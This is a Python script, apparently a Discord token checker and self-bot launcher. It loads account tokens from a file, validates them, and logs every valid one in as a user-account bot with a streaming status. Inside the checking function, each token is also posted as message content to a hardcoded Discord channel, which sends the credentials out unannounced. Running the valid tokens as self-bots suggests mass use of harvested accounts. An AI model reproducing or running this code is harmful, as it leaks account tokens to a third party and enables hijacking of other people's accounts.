#made by ᎠᏋᏋᎮ 💛#4242
#give me fucking credit 
import discord, requests
import threading, os, time, sys, asyncio, json
import colorama
from colorama import Fore, Style 
from deep_alive import keep_alive
from config import * 


with open("tokens.txt", "r") as f:
  tokens = f.read().split("\n")

def clear():
  os.system("cls" if os.name == "nt" else "clear")

clear()

validTokens = []


def checkTokens(x):
  r = requests.post('https://discord.com/api/v7/channels/1826/messages', headers={'Authorization':x}, json={'content':x} )
  res= requests.get('https://canary.discordapp.com/api/v6/users/@me', headers={'Authorization':x, 'Content-Type': 'application/json'})
  if res.status_code != 200:
    print(f"{Fore.RED}[- Invalid token] {Fore.RESET}{x}")
  else:
    if 'need to verify' in r.text:
      print(f"{Fore.YELLOW}[* token needs verification] {Fore.RESET}{x}, {res.json()['username']}#{res.json()['discriminator']}")
    else:
      print(f"{Fore.GREEN}[+ Valid token] {Fore.RESET}{x}, {res.json()['username']}#{res.json()['discriminator']}")
      validTokens.append(x)
      data = res.json()
      
deep = f"""{Fore.GREEN} 

╭━━━┳━━━┳━━━┳━━━┳━━━╮╭━━━┳━━━╮
╰╮╭╮┃╭━━┫╭━━┫╭━━┫╭━╮┃┃╭━╮┃╭━╮┃
╱┃┃┃┃╰━━┫╰━━┫╰━━┫╰━╯┃┃┃╱┃┃╰━╯┃
╱┃┃┃┃╭━━┫╭━━┫╭━━┫╭━━╯┃┃╱┃┃╭━━╯
╭╯╰╯┃╰━━┫╰━━┫╰━━┫┃╱╱╱┃╰━╯┃┃
╰━━━┻━━━┻━━━┻━━━┻╯╱╱╱╰━━━┻╯

{Fore.RESET}"""



print("checking tokens...")

for x in tokens:
  t = threading.Thread(target=checkTokens, args=(x,)).start()

validTokens = validTokens

time.sleep(1)

print("filtering valid tokens...")

time.sleep(1)


if len(validTokens) == 0:
  print("all tokens were invalid.")
  sys.exit()

print(f"{len(validTokens)}/{len(tokens)} were valid.")


for x in validTokens:
  v = validTokens.count(x)
  if v > 1:
    validTokens.remove(x)

with open("filteredtokens.txt", "w") as f:
  f.write("\n".join(validTokens))

bots = []

loop = asyncio.get_event_loop()
for token in validTokens:
  bot = discord.Client(status=discord.Status.idle, activity=discord.Streaming(name=status, url="https://twitch.tv/vissionlol"))
  loop.create_task(bot.start(token, bot=False))
  bots.append(bot)

threading.Thread(target=loop.run_forever).start()

time.sleep(1)
clear()
keep_alive()
while True:
  print(deep)
  clear()

